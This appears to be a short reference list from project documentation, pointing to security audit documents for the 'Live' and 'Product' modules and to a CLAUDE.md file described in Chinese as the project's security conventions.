- `docs/modules/live/security-audit.md` - Live 模块安全审计
- `docs/modules/product/security-audit.md` - Product 模块安全审计
- `CLAUDE.md` - 项目安全规范

